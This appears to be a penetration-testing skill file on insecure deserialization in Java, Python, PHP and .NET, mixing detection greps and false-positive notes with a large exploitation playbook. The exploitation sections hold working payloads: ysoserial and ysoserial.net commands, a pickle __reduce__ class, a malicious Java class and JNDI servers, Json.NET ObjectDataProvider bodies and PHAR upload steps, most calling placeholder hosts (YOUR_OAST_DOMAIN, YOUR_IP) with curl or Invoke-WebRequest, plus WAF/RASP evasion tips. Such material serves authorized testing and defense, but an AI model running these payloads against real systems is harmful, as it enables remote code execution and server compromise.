---
name: deserialization
description: Java/Python/PHP/.NET insecure deserialization attacks with ysoserial, gadget chains, and detection methods
---

# Insecure Deserialization

Deserialization of untrusted data allows attackers to abuse object graphs and gadget chains to achieve Remote Code Execution (RCE), authentication bypass, and data tampering. This affects Java, Python, PHP, .NET, Ruby, and virtually any language with object marshalling. Treat all serialized input as hostile until proven otherwise.

## Attack Surface

**Scope**
- Java `ObjectInputStream`, XMLDecoder, Jackson (polymorphic), Kryo, Hessian, JNDI injection
- Python `pickle`, `yaml.load()`, `shelve`, `marshal`, `jsonpickle`
- PHP `unserialize()`, PHAR deserialization (POP chains in Laravel, Drupal, WordPress, etc.)
- .NET `BinaryFormatter`, `XmlSerializer`, `Json.NET` TypeNameHandling, `ObjectStateFormatter`

**Common Entry Points**
- Session cookies and tokens (base64-encoded serialized blobs)
- API bodies containing `@type`, `$type`, `__type`, `javaSerializedData` fields
- Multipart uploads with embedded objects (PHAR files, Excel/DOCX with pickled objects)
- Message queues, caching layers (Redis, Memcached) storing serialized state
- Hidden/undocumented parameters: `rO0AB` (Java base64), `O:4:"User"` (PHP), `\x80\x04\x95` (Python pickle)

**Serialization Indicators**
| Language | Magic Bytes / Pattern |
|----------|----------------------|
| Java | `rO0AB` (base64), `aced0005` (hex), starts with `\xac\xed` |
| Python pickle | `\x80\x04\x95` (protocol 4), `\x80\x03\x95` (protocol 3) |
| PHP | `O:4:"User"`, `a:3:{`, base64 variants like `Tzo0...` |
| .NET BinaryFormatter | `\x00\x01\x00\x00\x00\xFF\xFF\xFF\xFF` |
| Msgpack | `\x92\xcd` / `\x93\xce` patterns |

## High-Value Targets

### Java

- **Commons Collections** (pre-3.2.2): `InvokerTransformer`, `ChainedTransformer`, `ConstantTransformer` — trivial RCE via `Runtime.exec()`
- **Commons Beanutils 1.x**: `PropertyUtils.getProperty()` → arbitrary getter invocation
- **Spring/SpringBoot**: `spring-context` JNDI lookup chains, `spring-aop` proxies
- **Groovy**: `MethodClosure` → `ProcessGroovyMethods.execute()`
- **JDK-only chains**: `TemplatesImpl`, `PriorityQueue` + `BeanComparator`, `JRMPClient`
- **Jackson polymorphism**: `@JsonTypeInfo(use=Id.CLASS)` → instantiate arbitrary classes

### Python

- **pickle**: `__reduce__()` returns `(os.system, ('id',))` — direct RCE
- **PyYAML**: `yaml.load()` with `!!python/object/apply:os.system ['id']`
- **jsonpickle**: construct objects with `py/module:os.system`

### PHP

- **Laravel**: `PendingBroadcast::__destruct()` → `Dispatcher::dispatch()` — command execution
- **Drupal**: `GuzzleHttp\Psr7\FnStream`, `GuzzleHttp` chains — pre-Drupal 8.x RCE
- **WordPress**: `__destruct()` in `WP_User_Query`, `__wakeup()` chains
- **Generic POP**: look for `__destruct()`, `__wakeup()`, `__toString()`, `__call()` magic methods

### .NET

- **BinaryFormatter**: `WindowsIdentity` → `TypeConfuseDelegate` → `System.Diagnostics.Process.Start()`
- **Json.NET TypeNameHandling.All**: `"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"` → XAML RCE
- **DataSet/DataTable** (TypeConfuseDelegate): `DataTable.ReadXml()` with `TypeNameHandling`
- **ObjectDataProvider**: chain `MethodName=Start`, `ObjectInstance=ProcessStartInfo`

## Detection Methods

### Static Indicators

```bash
# Scan for deserialization sinks in Java
grep -rn "ObjectInputStream" --include="*.java" .
grep -rn "readObject" --include="*.java" .
grep -rn "XMLDecoder" --include="*.java" .
grep -rn "HessianInput\|Hessian2Input" --include="*.java" .
grep -rn "@JsonTypeInfo" --include="*.java" .

# Scan for pickle/PyYAML in Python
grep -rn "pickle.load\|pickle.loads\|yaml.load(" --include="*.py" .

# Scan for PHP unserialize
grep -rn "unserialize(" --include="*.php" .

# Scan for .NET deserialization
grep -rn "BinaryFormatter\|TypeNameHandling" --include="*.cs" .
grep -rn "ObjectStateFormatter\|LosFormatter" --include="*.cs" .
```

### Runtime Detection

- Monitor for `/dev/shm` writes, `/tmp` file creation, network egress from app processes
- RASP/bytecode instrumentation: `ysoserial-detector`, OWASP DesDefender
- WAF signatures: `aced0005`, `rO0AB`, `ProcessBuilder`, `Runtime.exec`, `CommonsCollections`
- Java class loading logs: unexpected `sun.misc.Unsafe.defineClass` or JNDI lookups

## Exploitation Techniques

### Java with ysoserial

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections7 'curl http://YOUR_OAST_DOMAIN/$(whoami)' | base64 -w0

# Generate payload for JNDI injection (Java < 8u191)
java -jar ysoserial.jar JRMPClient 'YOUR_IP:1099' | base64 -w0

# Start JRMPListener for JNDI callback
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections7 'touch /tmp/rce'

# Hessian deserialization
java -jar ysoserial.jar Hessian1 'curl http://YOUR_OAST_DOMAIN/pwned' | base64 -w0

# Test which gadgets the target classpath supports
java -jar ysoserial.jar --generate 'CommonsCollections1,CommonsCollections2,CommonsCollections3,CommonsCollections5,CommonsCollections6,CommonsCollections7,CommonsBeanutils1,Groovy1,Jdk7u21' 'id' 2>&1 | grep -v "Not supported"
```

### Java JNDI Injection

```bash
# marshalsec — start LDAP/HTTP redirector
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://YOUR_IP:8888/#Exploit" 1389

# Compile and host malicious class
echo 'import java.io.*; public class Exploit { static { try { Runtime.getRuntime().exec("curl http://YOUR_OAST_DOMAIN/jndi"); } catch(Exception e){} } }' > Exploit.java
javac Exploit.java
python3 -m http.server 8888

# Payload to trigger (JNDI lookup string)
# ${ldap://YOUR_IP:1389/Exploit}
# ${rmi://YOUR_IP:1099/Exploit}
```

### Java Jackson/Json.NET Polymorphism

```bash
# Jackson with enableDefaultTyping or @JsonTypeInfo(use=Id.CLASS)
curl -X POST https://TARGET/api/data -H 'Content-Type: application/json' -d '{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://YOUR_IP:1389/Exploit",
  "autoCommit": true
}'

# .NET TypeNameHandling.All
curl -X POST https://TARGET/api/data -H 'Content-Type: application/json' -d '{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd", "/c calc"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd",
      "Arguments": "/c calc"
    }
  }
}'
```

### Python Pickle

```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://YOUR_OAST_DOMAIN/$(whoami)',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(f"Base64 payload: {payload.decode()}")
```

```bash
# PyYAML exploit
python3 -c "import yaml; print(yaml.load('!!python/object/apply:os.system [\"curl http://YOUR_OAST_DOMAIN\"]', Loader=yaml.FullLoader))"
```

### PHP POP Chain

```bash
# Laravel RCE via phar:// deserialization
# Step 1: Generate PHAR with POP chain
php -d phar.readonly=0 generate_phar.php payload.phar

# Step 2: Upload PHAR (image upload, document import)
curl -X POST https://TARGET/upload -F 'file=@payload.phar;type=image/jpeg'

# Step 3: Trigger via phar:// wrapper in any file operation
curl "https://TARGET/api/file?path=phar://uploads/payload.phar/test.txt"

# Generic PHP serialize/unserialize cookie attack
php -r 'echo base64_encode(serialize(new EvilClass()));'
```

### .NET BinaryFormatter

```powershell
# ysoserial.net
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c calc" -o base64

# Generate ViewState deserialization payload (requires machineKey)
ysoserial.exe -g TextFormattingRunProperties -f LosFormatter -c "powershell Invoke-WebRequest http://YOUR_OAST_DOMAIN/pwned" -o base64

# Json.NET TypeNameHandling
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c calc" -o raw
```

## Bypass Techniques

**Filter Evasion**
- Use different gadget chains if one is blacklisted (ysoserial has 30+ chains)
- JNDI: use local class loading (Tomcat `BeanFactory`, `ELProcessor`) for JDK 8u191+
- Jackson: switch from `@type` to `@class` or use native type hints
- Replace `Runtime.exec` chains with `ProcessBuilder`, `ScriptEngine`, `JdbcRowSetImpl`
- Double-encode base64, URL-encode special characters in serialized strings

**RASP/WAF Bypass**
- Fragment payloads across multiple requests (session reconstruction)
- Use alternative serialization formats (Hessian, Kryo, Protocol Buffers)
- Embed payloads in legitimate structures (XML, JSON, multipart) to avoid pattern matching
- Wrap Java payloads in valid JAR with manifest to evade byte-pattern detection

**AppServer-Specific**
- Tomcat: use `BeanFactory` + `ELProcessor` for post-8u191 JNDI
- WebLogic: use `T3/IIOP` protocol deserialization (separate from HTTP)
- JBoss: `Invoker` servlet, `JMXInvokerServlet` deserialization endpoints

## Chaining Attacks

- Deserialization → RCE → reverse shell → lateral movement
- Deserialization → SSRF via URL object (e.g., `URLDNS` chain for blind detection)
- Session deserialization → authentication bypass → admin access
- PHAR deserialization → SSRF → internal service access → credentials
- Jackson polymorphism → ObjectDataProvider → PowerShell download cradle → C2

## Testing Methodology

1. **Detect serialization format** — Examine all input (cookies, headers, body, params) for serialized patterns (`rO0AB`, `\xac\xed`, `O:N:"`, `\x80\x04`, TypeNameHandling markers)
2. **Identify framework/language** — Server headers (`X-Powered-By`), error pages, source maps, stack traces, `robots.txt`, `/actuator`, `/info` endpoints
3. **Confirm deserialization sink** — Send `URLDNS` (Java), pickle probe, `unserialize` error trigger; verify via OAST callback or timing
4. **Test gadget chains** — Start with ysoserial `--generate` batch, try top 5 chains for detected library versions
5. **Escalate to RCE** — Replace DNS probe with command execution payload; use `curl` to OAST domain before attempting reverse shell
6. **Verify blind execution** — If no output visible, use OAST callbacks, file creation (`touch /tmp/rce_check`), or time-based delays (`sleep 5`)

## Validation

1. Prove deserialization occurred: DNS callback via `URLDNS` chain, error message reveals `readObject()` path, or time delay confirms code execution
2. Demonstrate impact: actual command execution output (OAST HTTP callback with `whoami`, `id`), file write proof, or data exfiltration
3. Show the gadget chain and classpath version (library version in `pom.xml`, `requirements.txt`, `composer.lock`, `.csproj`)
4. Document which sink endpoint, parameter, and content-type accepted the payload
5. If blind, confirm via multiple signal types (DNS + HTTP OAST + timing)

## False Positives

- Text that coincidentally matches serialization patterns (base64 strings starting with `rO0AB`)
- Serialization present but using safe deserializers (`ObjectInputFilter`, `ValidatingObjectInputStream`, pickle with `RestrictedUnpickler`)
- `yaml.safe_load()` instead of `yaml.load()` — no object instantiation
- PHP `unserialize()` with `allowed_classes` array that restricts to known-safe classes
- .NET `DataContractSerializer` without `KnownType` attributes — typically safe
- TypeNameHandling set to `None` (default safe setting)

## Impact

- Remote Code Execution — full server compromise (most critical)
- Authentication bypass via session token manipulation
- Arbitrary file read/write leading to config disclosure or webshell deployment
- SSRF and cloud metadata access via URL-based gadget chains
- Data exfiltration, cryptomining, ransomware deployment, lateral movement

## CVSS Scoring

| Scenario | CVSS 3.1 | Vector |
|----------|----------|--------|
| Java RCE via ysoserial chain | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| Python pickle RCE (stored input) | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| PHP PHAR SSRF/RCE | 9.1 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| .NET BinaryFormatter RCE | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| Jackson TypeNameHandling (restricted) | 8.1 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
| Blind DNS via URLDNS chain | 5.3 | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N |

## Pro Tips

1. Start with `URLDNS` gadget — it requires zero dependencies and works against every Java app with a DNS resolver
2. Use `ysoserial.jar --generate` with comma-separated chains to test all supported gadgets in one shot
3. For post-8u191 JDK: look for Tomcat `BeanFactory` + `ELProcessor` JNDI local gadget
4. Always check for secondary deserialization sinks: XMLDecoder, XStream, JAXB, SnakeYAML, JNDI lookups
5. PHAR deserialization is the most underrated PHP attack — any `file_exists()`, `is_file()`, `filemtime()` call triggers it
6. Python `yaml.load()` without `Loader=yaml.SafeLoader` is nearly always exploitable — scan for it
7. Check HTTP headers (`X-Serialized-Data`, `X-Session-Data`) and cookies — they are common hidden sinks
8. For .NET: `TypeNameHandling` defaults to `None`; any value above `None` (Auto, Objects, All) is dangerous
9. Always validate with OAST — blind deserialization is the norm; DNS resolution proves code execution
10. Keep a local ysoserial + ysoserial.net + phpggc + pickle payload generator ready for each engagement

## Summary

Deserialization vulnerabilities turn data parsing into code execution. Every framework's serialization format has known gadget chains; the only defense is avoiding deserialization of untrusted input entirely or using allowlisted, type-safe deserializers. If you can make the server deserialize untrusted data, you likely have RCE.
